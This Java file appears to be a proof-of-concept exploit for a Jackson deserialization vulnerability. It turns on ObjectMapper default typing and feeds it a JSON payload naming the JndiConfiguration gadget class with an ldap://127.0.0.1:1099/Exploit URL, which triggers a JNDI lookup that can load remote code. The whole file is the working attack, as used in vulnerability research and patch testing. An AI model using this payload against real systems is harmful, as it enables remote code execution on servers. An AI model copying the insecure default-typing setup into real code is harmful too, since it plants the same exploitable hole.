package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class Poc {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.pastdev.httpcomponents.configuration.JndiConfiguration\",\"ldap://127.0.0.1:1099/Exploit\"]";
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}